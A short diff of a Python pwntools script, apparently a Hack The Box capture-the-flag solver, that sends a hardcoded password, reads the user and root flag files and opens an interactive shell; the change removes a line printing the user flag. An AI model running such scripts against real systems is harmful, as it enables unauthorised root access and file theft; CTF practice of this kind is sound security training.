@@ -38,7 +38,6 @@ pwn.sendline('uhc-9qual-global-pw')
 time.sleep(2)
 pwn.sendline('echo user+root')
 pwn.sendline('cat /home/htb/user.txt')
-print('user:'+pwn.recvlineS())
 pwn.sendline('cat /root/root.txt')
 pwn.interactive()
 
